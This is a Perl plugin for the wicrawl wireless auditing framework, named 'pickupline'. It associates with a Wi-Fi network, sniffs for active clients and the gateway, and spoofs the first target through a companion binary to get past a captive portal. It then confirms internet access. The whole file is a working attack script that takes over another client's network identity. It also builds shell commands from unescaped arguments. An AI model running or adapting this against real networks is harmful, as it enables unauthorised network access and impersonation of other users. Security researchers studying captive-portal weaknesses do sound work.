#!/usr/bin/perl -w
#
#	This is a pickupline plugin for getting around captive proxies 
#
# http://midnightresearch.com/projects/wicrawl

$|=1;
use strict;
use Getopt::Std;
use IPC::Open3;
use File::Basename;
$Getopt::Std::STANDARD_HELP_VERSION='1';

my $bssid=0; my $encryption=""; my $ssid=0; my $interface=0; my $nick=0; my $version=0; my $run=0;
our($opt_b, $opt_e, $opt_i, $opt_s, $opt_n, $opt_r, $opt_v);
getopts ("b:e:i:n:r:s:v:");

my $basedir=dirname($0);
my $have_target=0;


if(    (!defined $opt_b) || (!defined $opt_i)
    || (!defined $opt_n) || (!defined $opt_s)
    || (!defined $opt_v) || (!defined $opt_e)
		|| (!defined $opt_r)) {
  print "  [!] usage $0 <options>\n";
  print "\t-b <bssid>\n";
  print "\t-e <encryption type>\n";
  print "\t-i <interface>\n";
  print "\t-n <nickname>\n";
  print "\t-s <ssid>\n";
  print "\t-r <run>\n";
  print "\t-v <version>\n";
	exit 1;
}

$bssid =      $opt_b if(defined $opt_b);
$encryption = $opt_e if(defined $opt_e);
$ssid =       $opt_s if(defined $opt_s);
$interface =  $opt_i if(defined $opt_i);
$nick =       $opt_n if(defined $opt_n);
$run =        $opt_r if(defined $opt_r);
$version =    $opt_v if(defined $opt_v);

# We require a few things to run
my $pul= $basedir . "/pul/pul";
if( ! -x $pul ) {
	print "  [!] Binary [$pul] does not exist, did you run make?\n";
	exit 1;
}

# Using the iwconfig_associate plugin
# We need to add plugin dependencies
my $iwconfig=$basedir . "/../iwconfig_associate/iwconfig_associate.pl";
if( ! -x $iwconfig ) {
	print "  [!] Can't find associate plugin, but require it. Looking for: [$iwconfig]\n";
	exit 1;
}

# Require the check_internet plugin
my $chkinternet=$basedir . "/../check_internet/check_internet.pl";
if( ! -x $chkinternet ) {
	print "  [!] Can't find check_internet plugin, but require it. Looking for: [$chkinternet]\n";
	exit 1;
}


print "  =========== <pickupline plugin > ==============\n";
print "  [*] Trying to associate to look for targets\n";

# Require the associate_iwconfig plugin
system("$iwconfig -b $bssid -e $encryption -s $ssid -i $interface -n $nick -r $run -v $version");
my $rc=$? >> 8;
if ($rc != 8) {
	print "  [*] Association failed.., exiting pickup line plugin..\n";
	exit 1;
}

print "  [*] Association looks good, starting pickup line\n";
my $pid = open3(\*WRITER, \*READER, \*READER, $pul);
if($pid < 0) {
	print "  [!] Can't fork [$pul]\n";
	exit 1;
}


# set interface
print "  [*] Setting pickup line interface to [$interface]\n";
print WRITER "interface\n";
print WRITER $interface . "\n";

# run start
print "  [*] Starting to sniff for active targets\n";
print WRITER "start\n";


# Check for target
while($have_target != 1) {

	# use readline so the child output is unbuffered
	while(readline(READER)) {
		my $msg=$_;	
		chomp $msg;

		#print "DEBUG: [$msg]\n";

		# We need to wait not only until we have a target,
		# but actually until we can see the gateway
		if($msg =~ /.*got the gateway IP \((.*)\)/) {
			print "  [*] Found Gateway IP [$1]\n";
			$have_target=1;
			last;
		}
		if($msg =~ /.*Adding new target (.*)/) {
			print "  [*] Adding new target [$1]\n";
			$have_target=1;
			last;
		}
	}
}

# spoof
print "  [*] Starting spoof of first target\n";
print WRITER "spoof\n";
print WRITER "1\n";

# Re-associate with the associate_iwconfig plugin
system("$iwconfig -b $bssid -e $encryption -s $ssid -i $interface -n $nick -r $run -v $version");
$rc=$? >> 8;

if ($rc != 8) {
	print "  [!] Re-association failed... exiting now\n";
	exit 1;
} else {
	print "  [*] Association worked, going to check internet now\n";
}


# Check internet
system("$chkinternet -b $bssid -e $encryption -s $ssid -i $interface -n $nick -r $run -v $version");
$rc=$? >> 8;



if ($rc != 10) {
	print "  [!] Check internet plugin failed...\n";
	print "  =========== </pickupline plugin> ==============\n";
	exit 10;
} else {
	print " [**] Internet check worked!  Pickup Line was successful!\n";
	print "  =========== </pickupline plugin> ==============\n";
	exit 0;
}


# vim:ts=2:sw=2:sts=0
